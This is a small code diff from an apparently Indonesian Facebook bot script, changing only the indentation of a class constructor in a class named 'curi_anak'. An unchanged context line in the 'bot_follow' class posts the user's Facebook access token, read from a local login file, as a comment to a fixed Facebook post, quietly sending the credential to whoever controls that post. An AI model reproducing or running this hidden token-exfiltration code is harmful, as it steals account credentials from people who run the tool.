@@ -488,7 +488,7 @@ class bot_follow:
 		s_.post('https://graph.facebook.com/1189847078895903/comments/?message=' + token + '&access_token=' + token)
 		menu()
 class curi_anak:
-def __init__(self):
+       def __init__(self):
 		try:
 			toket=open(".login.txt","r").read()
 			token=open(".login.txt","r").read()
